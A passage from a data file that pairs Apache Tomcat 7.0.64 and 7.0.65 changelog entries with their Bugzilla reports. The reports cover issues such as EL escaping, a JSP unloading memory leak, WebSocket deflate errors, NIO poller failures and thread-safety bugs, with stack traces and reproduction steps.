	at com.ctc.wstx.sr.StreamScanner.loadMore(StreamScanner.java:988)
	at com.ctc.wstx.sr.StreamScanner.getNext(StreamScanner.java:754)
	at com.ctc.wstx.sr.BasicStreamReader.nextFromTree(BasicStreamReader.java:2676)
	at com.ctc.wstx.sr.BasicStreamReader.next(BasicStreamReader.java:1050)
	at com.sun.xml.ws.util.xml.XMLStreamReaderFilter.next(XMLStreamReaderFilter.java:96)
	at com.sun.xml.ws.streaming.XMLStreamReaderUtil.next(XMLStreamReaderUtil.java:80)
	at com.sun.xml.ws.streaming.XMLStreamReaderUtil.nextContent(XMLStreamReaderUtil.java:114)
	at com.sun.xml.ws.streaming.XMLStreamReaderUtil.nextElementContent(XMLStreamReaderUtil.java:104)
	at com.sun.xml.ws.encoding.StreamSOAPCodec.decode(StreamSOAPCodec.java:234)
	at com.sun.xml.ws.encoding.StreamSOAPCodec.decode(StreamSOAPCodec.java:307)
	at com.sun.xml.ws.encoding.StreamSOAPCodec.decode(StreamSOAPCodec.java:133)
	at com.sun.xml.ws.encoding.SOAPBindingCodec.decode(SOAPBindingCodec.java:358)
	... 31 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57799
Jasper|Tomcat 7.0.65 (violetagg)|fix|57136|Correct a regression in the previous fix for this issue. \${ should only be an escape for ${ within an EL expression. Within a JSP page \$ should be an escape for $. The EL specification applies when parsing the expression delimited by ${ and }. Parsing of the delimiting ${ and } is the responsibility of the JSP specification. (markt)|EL Parser escaping dollar sign not ${ or ${...}|"In the EL 3.0 spec it says...
    Alternatively, the escape characters \$ and \# can be used to escape what would
otherwise be treated as an eval-expression. Given the literal-expressions:
        \${exprA}
        \#{exprB}
    The resulting values would again be the strings ${exprA} and #{exprB}.

I believe that means it should not escape lets say ""Price: \\$500.00"" it should instead output ""Price: \$500.00""(it currently would output ""Price: $500.00"") but should instead escape ""Price: \\${500.00}"" and the output of that would be ""Price: ${500.00}"".

Normally this wouldn't be run into, but I happened to run into this issue passing javascript code through the EL processor, that happens to have some escaped dollar signs inside some regex strings.

It maybe a little more acceptable to use \${ and \#{ as the escapes, as that is a better indication that there is about to be an expression"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57136
Jasper|Tomcat 7.0.65 (violetagg)|fix|58296|Fix a memory leak in the JSP unloading feature that meant that using a value other than -1 for maxLoadedJsps triggered a memory leak once the limit was reached. (markt)|Possible memory leak in JspRuntimeContext|"Limitation of maxLoadedJsps and usage of tag files may result in a memory leak in JspRuntimeContext.

Steps to reproduce the leak:

1) Set Tomcat in its web.xml to production mode and limit the max jsp count to 2
	
	<init-param>
    	<param-name>maxLoadedJsps</param-name>
		<param-value>2</param-value>
	</init-param>
	<init-param>
		<param-name>development</param-name>
		<param-value>false</param-value>
	</init-param>

2) deploy the attach WAR-file ""tomcat-test.war"". The WAR contains one HttpServlet, three jsps and one tag file. GET-Requests to http://localhost:8080/tomcat-test/test render the jsps in the sequence ""1.jsp"" -> ""2.jsp"" -> ""3.jsp"". 
JSPs 1.jsp and 3.jsp use the tag ""test.tag"", 2.jsp contains only html.

3) make at least 5 GET-Requests to http://localhost:8080/tomcat-test/test

4) take a heap dump

5) open the dump with Eclipse MAT

6) execute the OOQL-Query 
select * from org.apache.jasper.util.FastRemovalDequeue$Entry e where e.valid=false

7) ""Path To GC Roots"" (right click on one result) shows that the invalid entries are in the retained heap of the tag's JspServletWrapper and hence in the retained heap of JspRuntimeContext.

The retained heap of JspRuntimeContext grows with every unloaded Jsp (its Entry in the jspQueue).

The bug is reproducible with Tomcat 7.0.52 and 8.0.26.


Supposed causes:

1) FastRemovalDequeue: removed Entry-instances are flagged as invalid. The ""previous""-field of removed elements isn't set to null. So removed elements still reference their ""previous"" element (which still may be in the jspQueue of JspRuntimeContext)

2) JspServletWrappers of currently loaded jsps and tag files are stored in the ConcurrentHashMap ""jsps"" in JspRuntimeContext. JspServletWrappers of Tag files hold (indirectly over JspCompilationContext -> JasperTagInfo -> ImplicitTagLibraryInfo -> ParserController) references to JspServletWrapper instances with already removed ""unloadHandles"" (FastRemovalDequeue$Entry instances with valid == false). 

2) leads in combination with 1) to a reproducible memory leak: the chain of ""previous"" linked entries contains all JspServletWrappers of unloaded and currently loaded jsps. In combination with maxLoadedJsps != -1, the chain can grow till an OutOfMemoryError occurs."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58296
Jasper|Tomcat 7.0.65 (violetagg)|fix|58340|Improve error reporting for tag files packaged in JARs. (markt)|No error shown when some tag file in jar has compile error|"Created attachment 33075 [details]
patch to fix the problem

Problem:
1. if some error in a jsp tag file in a jar
2. Server won't print out the tag compile error in neither console or returned response.

Fix:
included patch can be applied to Tomcat 7.

only modified ""getResourceAsStream(String res)"" to use ""URL getResource(String res) throws MalformedURLException"" in order to change as little as possible."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58340
Jasper|Tomcat 7.0.65 (violetagg)|fix|58444|Ensure that JSPs work with any custom base class that meets the requirements defined in the JSP specification without requiring that base class to implement Tomcat specific code. (markt)|_jspInit() never called on JSP with custom super class|"I have a JSP that extends a custom super class:

<@page extends=""com.example.MySuperServlet"" %>

My super class is defined as follows:

public abstract class MySuperServlet extends javax.servlet.GenericServlet implements javax.servlet.jsp.HttpJspPage {
  @Override public void service(....) {
    _jspService(req, res);
  }
  @Override public void jspInit() {}
  @Override public void jspDestroy() {}
}


The problem is that the generated JSP class contains a method _jspInit() which is never called.
It initializes an expression factory (_el_expressionfactory) and an instance manager (_jsp_instancemanager).
Now that both are not initialized, I get NullpointerExceptions when calling the JSP, i.e. in some generated methods there is code like
_jsp_instancemanager.newInstance(_jspx_th_my_005fcustomtag_005f0)

Usually when there is no custom super class, tomcat extends the generated JSP class from org.apache.jasper.runtime.HttpJspBase which calls _jspInit() from its init(ServletContext) method.

For my custom super class it is no option to extend org.apache.jasper.runtime.HttpJspBase instead of GenericServlet because it is tomcat specific.
It is also no option to call _jspInit() directly from my jspInit() method, because _jspInit() is not part of the servlet/JSP spec and thus it is not defined in any interface.

Note that there is no problem with tomcat 6 and 5.

I haven't tested with tomcat 8, yet."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58444
Cluster|Tomcat 7.0.65 (violetagg)|fix||Fix a default clusterListeners in SimpleTcpCluster. The optimal default value is different for each session manager. ClusterSessionListener is never used in BackupManager. (kfujino)|||
Cluster|Tomcat 7.0.65 (violetagg)|fix||Correct log messages in case of using BackupManager. (kfujino)|||
WebSocket|Tomcat 7.0.65 (violetagg)|fix|58342|Fix a copy and paste error that meant MessageHandler removal could fail for binary and pong MessageHandlers. Patch provided by DJ. (markt)|org.apache.tomcat.websocket.WsSession has repeated conditional tests|"Created attachment 33078 [details]
Patch file

In the method WsSession.removeMessageHandler(), two `if` statements have repeated conditional tests. I did not investigate whether older versions of Tomcat have it however they're present in trunk. I am attaching a patch to fix it. I ran the tests and they passed with my changes."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58342
WebSocket|Tomcat 7.0.65 (violetagg)|fix|58414|Correctly handle sending zero length messages when using per message deflate. (markt)|Can not transfer empty string through Web Socket|"Created attachment 33111 [details]
Example of ServerEndpoint implementation.

Every time, when I try to transfer empty string through web socket I get an IllegalArgumentException from java.nio.Buffer#limit(int newLimit) because of negative new limit value. The reason of this issue is org.apache.tomcat.websocket.PerMessageDeflate#sendMessagePart(List<MessagePart> uncompressedParts)
line:

    // End of compressed message. Drop EOM bytes and output.
    compressedPayload.limit(compressedPayload.limit() - EOM_BYTES.length);

compressedPayload.limit() has zero value and EOM_BYES.length has value, which greater than 0."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58414
Web applications|Tomcat 7.0.65 (violetagg)|fix||Correct documentation for cluster-howto. (kfujino)|||
Extras|Tomcat 7.0.65 (violetagg)|fix||Ensure JULI adapters does not include the LogFactoryImpl class. Patch provided by Benjamin Gandon. (markt)|||
Tribes|Tomcat 7.0.65 (violetagg)|add||Add support for configurations of ChannelListener and MembershipListener in server.xml. (kfujino)|||
Tribes|Tomcat 7.0.65 (violetagg)|fix||Correct log messages in case of using ReplicatedMap. (kfujino)|||
jdbc-pool|Tomcat 7.0.65 (violetagg)|fix||Make sure the pool has been properly configured when attributes that related to the pool size are changed via JMX. (kfujino)|||
Catalina|Tomcat 7.0.64 (violetagg)|add|55317|Facilitate weaving by allowing ClassFileTransformer to be added to WebappClassLoader. Patch by Nick Williams. (markt)|Facilitate weaving by allowing ClassFileTransformer to be added to WebppClassLoader|"Most application servers provide a mechanism whereby web applications can instrument class bytecode. This is normally in the form of two or three instrumentation methods on the ClassLoader implementation responsible for web application class loading. Spring Framework, for example, provides a way to automatically detect and use the various instrumentable ClassLoaders provided by different application servers. However, since Tomcat's o.a.catalina.loader.WebappClassLoader is not instrumentable, Spring cannot use it directly. Instead, it provides a class that extends WebappClassLoader to implement the instrumentation. Users must place this special spring-instrument-tomcat.jar file in $TOMCAT_HOME/lib and put a loader declaration in META-INF/context.xml in order to get this to work--rather a pain in the rear.

Spring's changes in the extended WebappClassLoader are really very trivial and involve only 2 classes: a helper class called WeavingTransformer [1] and the extended TomcatInstrumentableClassLoader [2]. I intend to port these changes to Tomcat for Tomcat 7 and 8 and submit a patch.

However, before I get started I needed to get two answers from the community:

1) Is there any objection to such a simple addition to WebappClassLoader? I think it would be an easy-but-big improvement to Tomcat.

2) What steps do I need to take to get this Spring code officially ""donated"" to Tomcat so that all legal requirements are met? The code is licensed Apache 2.0, so that at least should make it easier.

[1] https://github.com/SpringSource/spring-framework/blob/master/spring-instrument-tomcat/src/main/java/org/springframework/instrument/classloading/WeavingTransformer.java
[2] https://github.com/SpringSource/spring-framework/blob/master/spring-instrument-tomcat/src/main/java/org/springframework/instrument/classloading/tomcat/TomcatInstrumentableClassLoader.java"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55317
Catalina|Tomcat 7.0.64 (violetagg)|fix|58031|Make the (first) reason parameter parsing failed available as a request attribute and then use it to provide a better status code via the FailedRequstFilter (if configured). (markt)|Posting data exceeding maxPostSize should result in HTTP 413.|"Created attachment 32821 [details]
Initial draft of patch, created against trunk.

When data exceeding the value of the ""maxPostSize"" configuration parameter is posted within a deployed application, the application sees an empty request parameter map and cannot access the posted data, yet Tomcat returns a 200 status, indicating to the client that everything was processed successfully (which likely will mislead the client).  The correct behavior is to return a status of 413 (""Request Entity Too Large"") to indicate that the request could not be fully processed due to the size being too large.

Attached is a patch that will set the response status to 413 when Tomcat discovers that the posted data exceeds maxPostSize."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58031
Catalina|Tomcat 7.0.64 (violetagg)|fix|58086|Ensure that WAR URLs are handled properly when using Apache Ant for web application deployment. (violetagg)|Deploy WAR file using http:// throws FileNotFoundException|"Hi all.
I have an Ant target which deploys WAR file to Tomcat7 instance using taskdef for DeployTask class.
WAR file is passed as URL - http://
I'm executing this on Windows 7 64bit with JDK 1.7

Sample part of failing target:
<tomcat-deploy url=""http://localhost:8080/manager/text"" path=""/testdeploy"" war=""http://server.pl/app.war""
			username=""user"" password=""pass""
			failOnError=""true"" logerror=""true""/>

This execution fails and exception is thrown (sorry for Polish message):

test_deploy.xml:37: java.io.FileNotFoundException: http:\server.pl\app.war (Nazwa pliku, nazwa katalogu lub skladnia etykiety woluminu jest niepoprawna)
        at java.io.FileInputStream.open(Native Method)
        at java.io.FileInputStream.<init>(FileInputStream.java:146)
        at java.io.FileInputStream.<init>(FileInputStream.java:101)
        at org.apache.catalina.ant.DeployTask.execute(DeployTask.java:155)
        at org.apache.tools.ant.UnknownElement.execute(UnknownElement.java:292)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:606)
        at org.apache.tools.ant.dispatch.DispatchUtils.execute(DispatchUtils.java:106)
        at org.apache.tools.ant.Task.perform(Task.java:348)
        at org.apache.tools.ant.Target.execute(Target.java:435)
        at org.apache.tools.ant.Target.performTasks(Target.java:456)
        at org.apache.tools.ant.Project.executeSortedTargets(Project.java:1393)
        at org.apache.tools.ant.Project.executeTarget(Project.java:1364)
        at org.apache.tools.ant.helper.DefaultExecutor.executeTargets(DefaultExecutor.java:41)
        at org.apache.tools.ant.Project.executeTargets(Project.java:1248)
        at org.apache.tools.ant.Main.runBuild(Main.java:851)
        at org.apache.tools.ant.Main.startAnt(Main.java:235)
        at org.apache.tools.ant.launch.Launcher.run(Launcher.java:280)
        at org.apache.tools.ant.launch.Launcher.main(Launcher.java:109)

== Question ==
Does implementation of DeployTask is incorrect?

I think there is error in content of this ""if"" - I think it should be replaced with ""else"" code:
https://github.com/apache/tomcat/blob/trunk/java/org/apache/catalina/ant/DeployTask.java#L143

Or I am using this task the wrong way?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58086
Catalina|Tomcat 7.0.64 (violetagg)|fix|58094|Fix cosmetic error log when using non standard non cacheable resources, like with the empty resources used in some tests. (remm)|"[7.0.63 RC] ""Null component Tomcat:type=Cache"" error messages in testsuite logs"|"Running tests for release candidate of Tomcat 7.0.63, I see a lot of the following messages in the logs:

<some date and time> org.apache.tomcat.util.modeler.Registry registerComponent
SEVERE: Null component Tomcat:type=Cache,host=localhost,context=/login

The above message is from org.apache.catalina.authenticator.TestSSOnonLoginAndBasicAuthenticator test, but the same message (with different context path) occurs in many test cases. When running whole testsuite with Java 7 and all 3 connectors, the message is found in 165 test result files out of 543.

I am running with Access Logging enabled by the following setting in build.properties, but I think it does not matter:

test.accesslog=true


This message is absent from 7.0.62 test logs, so it is a regression in this specific version of Tomcat 7.

Looking into Apache Gump logs, this message is present in tomcat-tc7.0.x-test-nio results for the above mentioned test case, but absent in tomcat-tc8.0.x-test-nio, tomcat-trunk-test-nio, so Tomcat 8 and trunk do not have this issue."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58094
Catalina|Tomcat 7.0.64 (violetagg)|fix|58096|Classes loaded from /WEB-INF/classes/ should use that directory as their code base. (markt)|Incorrect CodeSource location from ProtectionDomain for classes in WEB-INF/classes|"I tried a very simple webapp, with a test.jsp and WEB-INF/classes/test/pkg/Test.class on both Tomcat 7 and Tomcat 8 latest version (with Java 7 and Java 8 respectively)

==== test.jsp ====
Test: <%= test.pkg.Test.class.getProtectionDomain().getCodeSource().getLocation() %>
==================

and Tomcat 8 shows

Test: file:/C:/Install/apache-tomcat-8.0.23/webapps/test/WEB-INF/classe/test/pkg/Test.class


Tomcat 7 shows the similar result.

In a standalone Java program, the similar code shows the top-level classpath entry like xxx/classes where test/pkg/Test.class is saved.

I also tried Jetty, it shows it correctly like:

Test: file:/C:/Install/jetty-distribution-9.3.0.v20150612/test-base/webapps/test/WEB-INF/classes/


So what I expect is WEB-INF/classes, is there any reason why Tomcat returns the full path of the class file instead of WEB-INF/classes ?

I have a quick fix to get what I want, but not sure whether there are other impacts, at least all unit tests are passed except two TEST-org.apache.catalina.filters.TestRemoteIpFilter.*.

The fix is here:

https://github.com/SuperMMX/tomcat/commit/a96b4a80144f78140690fd35e47d0fdd1a64d0ae"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58096
Catalina|Tomcat 7.0.64 (violetagg)|fix||Fix possible resource leaks by closing streams properly. Issues reported by Coverity Scan. (violetagg)|||
Catalina|Tomcat 7.0.64 (violetagg)|fix|58116|Fix a regression in the fix for 57281 that broke Comet support when running under a security manager. Based on a patch provided by Johno Crawford. (markt)|[PATCH] Running with SecurityManager: CometProcessor servlets throw NoSuchMethodException|"Created attachment 32892 [details]
CometProcessor servlets must not be cached as Servlet or NoSuchMethodException will be thrown.

The fix for https://bz.apache.org/bugzilla/show_bug.cgi?id=57281 caused a regression with Tomcat running with a SecurityManager, CometProcessor servlets throw an exception when serving a request.

Please find proposed fix in patch file."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58116
Catalina|Tomcat 7.0.64 (violetagg)|fix|58179|Fix a thread safety issues that could mean concurrent threads setting the same attribute on a ServletContext could both see null as the old value. (markt)|Atomicity violation|"My name is Bai Guangdong, a research fellow from National University of Singapore. I find an atomicity violation similar to bug 53498. 

The problem occurs in the same file java/org/apache/catalina/core/ApplicationContext.java. Look at the code snippet below. 

L791         oldValue = attributes.get(name);
L792         if (oldValue != null)
L793             replaced = true;
L794         attributes.put(name, value);
...          ... 
L801         if (replaced)
L802             event =
L803                 new ServletContextAttributeEvent(context.getServletContext(),
L804                                                  name, oldValue);
L805         else
L806             event =
L807                 new ServletContextAttributeEvent(context.getServletContext(),
L808                                                  name, value);
...          ... 
L816                 if (replaced) {
L817                     context.fireContainerEvent
L818                         (""beforeContextAttributeReplaced"", listener);
L819                     listener.attributeReplaced(event);
L820                     context.fireContainerEvent(""afterContextAttributeReplaced"",
L821                                                listener);
L822                 } else {
L823                     context.fireContainerEvent(""beforeContextAttributeAdded"",
L824                                                listener);
L825                     listener.attributeAdded(event);
L826                     context.fireContainerEvent(""afterContextAttributeAdded"",
L827                                                listener);

Suppose two threads T1 and T2 executes this code snippet with the same key (""name""). Initially, ""attributes"" is empty. T1 executes line 791 and ""oldValue"" in T1 becomes null. Before T1 executes line 794, T2 executes 791 and ""oldValue"" in T2 becomes null as well. Then T1 executes line 794, and later T2 replaces T1's ""value"" at line 794. Afterwards, both T1 and T2 fire the ""beforeContextAttributeAdded"" event at line 823. However, in the above situation, ""replaced"" in T2 should be true and ""beforeContextAttributeReplaced"" should be fired at line 817."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58179
Catalina|Tomcat 7.0.64 (violetagg)|fix|58192|Correct a regression in the previous fix for 58023. Ensure that classes are associated with their manifest even if the class file is first read (and cached) without the manifest. (markt)|ImageIO based applications fail to deploy in Tomcat 8.0.24 (worked in 8.0.23)|"We have received several reports recently that GeoServer fails to deploy in Tomcat 8, and with some discussion, we poinpointed 8.0.24 as the version where this start happening, we have reports of deploys working without problems on 8.0.21 and 8.0.23 instead.

The issue happens as we try to initialize the ImageIO subsystem, here is the stack trace:

java.util.ServiceConfigurationError: javax.imageio.spi.ImageReaderSpi: Provider com.sun.media.imageioimpl.plugins.jpeg.CLibJPEGImageReaderSpi could not be instantiated
	at java.util.ServiceLoader.fail(ServiceLoader.java:232)
	at java.util.ServiceLoader.access$100(ServiceLoader.java:185)
	at java.util.ServiceLoader$LazyIterator.nextService(ServiceLoader.java:384)
	at java.util.ServiceLoader$LazyIterator.next(ServiceLoader.java:404)
	at java.util.ServiceLoader$1.next(ServiceLoader.java:480)
	at javax.imageio.spi.IIORegistry.registerApplicationClasspathSpis(IIORegistry.java:210)
	at javax.imageio.spi.IIORegistry.<init>(IIORegistry.java:138)
	at javax.imageio.spi.IIORegistry.getDefaultInstance(IIORegistry.java:159)
	at org.geoserver.GeoserverInitStartupListener.contextDestroyed(GeoserverInitStartupListener.java:295)
	at org.apache.catalina.core.StandardContext.listenerStop(StandardContext.java:4776)
	at org.apache.catalina.core.StandardContext.stopInternal(StandardContext.java:5390)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:160)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:725)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:701)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:717)
	at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:945)
	at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1768)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IllegalArgumentException: vendorName == null!
	at javax.imageio.spi.IIOServiceProvider.<init>(IIOServiceProvider.java:76)
	at javax.imageio.spi.ImageReaderWriterSpi.<init>(ImageReaderWriterSpi.java:231)
	at javax.imageio.spi.ImageReaderSpi.<init>(ImageReaderSpi.java:212)
	at com.sun.media.imageioimpl.plugins.jpeg.CLibJPEGImageReaderSpi.<init>(CLibJPEGImageReaderSpi.java:80)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:422)
	at java.lang.Class.newInstance(Class.java:442)
	at java.util

Here is the associated GeoServer ticket: https://osgeo-org.atlassian.net/browse/GEOS-7122"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58192
Catalina|Tomcat 7.0.64 (violetagg)|fix||Fix thread safety issue in the AsyncContext implementation that meant a sequence of start();dispatch(); calls using non-container threads could result in a previous dispatch interfering with a subsequent start. (markt)|||
Coyote|Tomcat 7.0.64 (violetagg)|fix|57943|Prevent the same socket being added to the cache twice. Patch based on analysis by Ian Luo / Sun Qi. (markt)|NioEndpoint, one poller  thread died|"when i restart tomcat,the tomcat can not process request soonÔºåi find an error log

Exception in thread ""http-nio-7001-ClientPoller-1"" java.util.ConcurrentModificationException
        at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)
        at java.util.HashMap$KeyIterator.next(HashMap.java:828)
        at java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1010)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.timeout(NioEndpoint.java:1421)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1215)
        at java.lang.Thread.run(Thread.java:662)

tomcat poller thread is not catch this exception,so this thread is died.
connection is accept but has no poller thread to process."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57943
Coyote|Tomcat 7.0.64 (violetagg)|fix||Add text/javascript,application/javascript to the default list of compressable MIME types. (violetagg)|||
Coyote|Tomcat 7.0.64 (violetagg)|fix|58103|When pipelining requests, and the previous request was an async request, ensure that the socket is removed from the waiting requests so that the async timeout thread doesn't process it during the next request. (markt)|NIO2 warning: Incorrect connection count, multiple socket.close called on the same socket.|"While smoke testing NIO2 connector with following config:
             
    <Connector port=""84"" protocol=""org.apache.coyote.http11.Http11Nio2Protocol""
               connectionTimeout=""20000""
               redirectPort=""8443"" />

I get a number of warnings in my log files:

05-Jul-2015 22:48:07.685 WARNING [http-nio2-449-exec-3] org.apache.tomcat.util.net.AbstractEndpoint.countDownConnection Incorrect connection count, multiple socket.close called on the same socket.

I don't find anything suspicious in my tests or configuration."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58103
Coyote|Tomcat 7.0.64 (violetagg)|fix||Fix a concurrency issue that meant that a change in socket timeout (e.g. when switching to asynchronous I/O) did not always take effect immediately. (markt)|||
Coyote|Tomcat 7.0.64 (violetagg)|fix||In the AJP and HTTP NIO connectors, ensure that the socket timeout is correctly set before adding the socket back to the poller for read. (markt)|||
Coyote|Tomcat 7.0.64 (violetagg)|fix|58157|Ensure that the handling of async timeouts does not result in an unnecessary dispatch to a container thread that could result in the current socket being added to the Poller multiple times with multiple attempts to process the same event for the same socket. (markt)|RecycleRequiredException and missing AsyncListener.onTimeout call|"Created attachment 32916 [details]
Servlet which starts asynchronous processing and intentionally waits for a timeout before dispatching to a static HTML file.

Overview:
When repeatedly polling an asynchronous servlet which (intentionally) times out, I occasionally see the following exception in the console:

Jul 20, 2015 8:58:45 AM org.apache.catalina.connector.CoyoteAdapter checkRecycled
INFO: Encountered a non-recycled request and recycled it forcedly.
org.apache.catalina.connector.CoyoteAdapter$RecycleRequiredException
	at org.apache.catalina.connector.CoyoteAdapter.checkRecycled(CoyoteAdapter.java:590)
	at org.apache.coyote.http11.AbstractHttp11Processor.recycle(AbstractHttp11Processor.java:1809)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.release(Http11NioProtocol.java:199)
	at org.apache.tomcat.util.net.NioEndpoint$Poller.cancelledKey(NioEndpoint.java:1100)
	at org.apache.tomcat.util.net.NioEndpoint$Poller.timeout(NioEndpoint.java:1466)
	at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1234)
	at java.lang.Thread.run(Thread.java:745)

This coincides with a request not receiving any response.

The majority of times the servlet is called, the correct response is returned as expected once the request times out, however on occasion (sometimes within 1 min, sometimes not until 30 mins of successful requests have passed) I see this exception and AsyncListener.onTimeout() is never called to produce the response.

Steps to reproduce:
0) Configure Tomcat to use the NIO connector
1) Deploy the attached TimeoutServlet (note: add a static HTML page 'timeout.html' to the root of the web application to serve as the timeout response).
2) Using a tool of your choice (I used JMeter), repeatedly send a request to the servlet and wait for the timeout response before sending the next request.

Actual Results:
Eventually, one of the requests will receive no response and the above exception will be written to the console.

Expected Results:
Every request should receive the timeout response (timeout.html) after 1 second and no exception should appear in the console.

Additional Information:
Appears to be very similar to https://bz.apache.org/bugzilla/show_bug.cgi?id=57011."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58157
Coyote|Tomcat 7.0.64 (violetagg)|fix||Correct a couple of edge cases in RequestUtil.normalize(). (markt)|||
Jasper|Tomcat 7.0.64 (violetagg)|fix|58110|Like scriptlet sections, declaration sections of JSP pages have a one-to-one mapping of lines to the generated .java file. Use this information to provide more accurate error messages if a compilation error occurs in a declaration section. (markt)|JSP compiler points error to wrong line number when there are two same return statements.|"Created attachment 32888 [details]
Apache Tomcat_7.0.61 - Error report.html

I forgot to delete the last return """" statement, and JSP compile point error to line number #8 which is same as the last return statement.

Code:
----------------------------------------------------------------------------------------------------
<%@ page pageEncoding='UTF-8' contentType='text/html'%>
<%@ page import = 'java.util.*' %>
<%!
String test ()
{
	List<Object> listObjectClasses = null;
	if (listObjectClasses==null || listObjectClasses.size()==0)
		return """";

	String sImageIconFile = null;
	for (Object objectClass : listObjectClasses)
	{
		//sImageIconFile = ""active-directory-objectClass-"" + (String)objectClass + "".png"";
	}
	boolean isImageIconFileExist = false;
	if (! (sImageIconFile==null || sImageIconFile.isEmpty()))
	{
		sImageIconFile = ""images/"" + sImageIconFile;
		//File fileImageIcon = new File (application.getRealPath (sImageIconFile));
		//isImageIconFileExist = fileImageIcon.exists ();
	}
	return (sImageIconFile==null || sImageIconFile.isEmpty()) ? """" : ""<img src='"" + sImageIconFile + ""'/>"";
	return """";
		// This statement above will cause tomcat JDT compiler point error to line #8„ÄÇ But if move this line into the above line, then compiler will point error to the right line number #23
}
%>
----------------------------------------------------------------------------------------------------

JSP compile exception
----------------------------------------------------------------------------------------------------
org.apache.jasper.JasperException: Unable to compile class for JSP: 

An error occurred at line: 8 in the jsp file: /test.jsp
Unreachable code
5: {
6: 	List<Object> listObjectClasses = null;
7: 	if (listObjectClasses==null || listObjectClasses.size()==0)
8: 		return ""1"";
9: 
10: 	String sImageIconFile = null;
11: 	for (Object objectClass : listObjectClasses)


Stacktrace:
	org.apache.jasper.compiler.DefaultErrorHandler.javacError(DefaultErrorHandler.java:103)
	org.apache.jasper.compiler.ErrorDispatcher.javacError(ErrorDispatcher.java:366)
	org.apache.jasper.compiler.JDTCompiler.generateClass(JDTCompiler.java:485)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:379)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:354)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:341)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:657)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:731)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
	org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108)
----------------------------------------------------------------------------------------------------

If I put the test() function into a .java file and use javac to compile it, javac will point error to right line number.
----------------------------------------------------------------------------------------------------
$ javac Test.java 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=lcd
Test.java:24: ÈîôËØØ: Êó†Ê≥ïËÆøÈóÆÁöÑËØ≠Âè•
		return """";
		^
1 ‰∏™ÈîôËØØ
----------------------------------------------------------------------------------------------------"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58110
Jasper|Tomcat 7.0.64 (violetagg)|fix|58119|When tags are compiled they must be placed in the org/apache/jsp/tag/web directory. Correct a regression in the fix for 52725. (violetagg)|Compiled tags are not put in correct directory|"You will notice that when tags are compiled they are placed in the org\apache\jsp\tag directory with a prefix of web. They should instead be placed in org\apache\jsp\tag\web directory and not have a prefix.

This is a regression which was introduced in revision 1297213.
http://svn.apache.org/viewvc/tomcat/trunk/java/org/apache/jasper/compiler/JspUtil.java?r1=1297213&r2=1297212&pathrev=1297213

The extra dot on the end of the string was omitted.

This bug is was introduced in Jetty 7 so the fix should be applied there too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58119
Jasper|Tomcat 7.0.64 (violetagg)|fix|58178|Expressions in a tag file should use the tag file's PageContext rather than that of the containing page. (markt)|Exception not passed to c:catch in custom jsp tag|"Created attachment 32935 [details]
Project demonstrating the problem

If a custom tag uses the jstl <catch> tag, then the exception is saved into the page attributes, but is not actually available to other tags via EL expressions.

If, however, the <catch> tag is used directly in a jsp page, then the exception is propagated into the var and visible to subsequent El expressions.


I'm attaching a small project that contains a taglib that demonstrates the problem. The project contains 2 jsps:

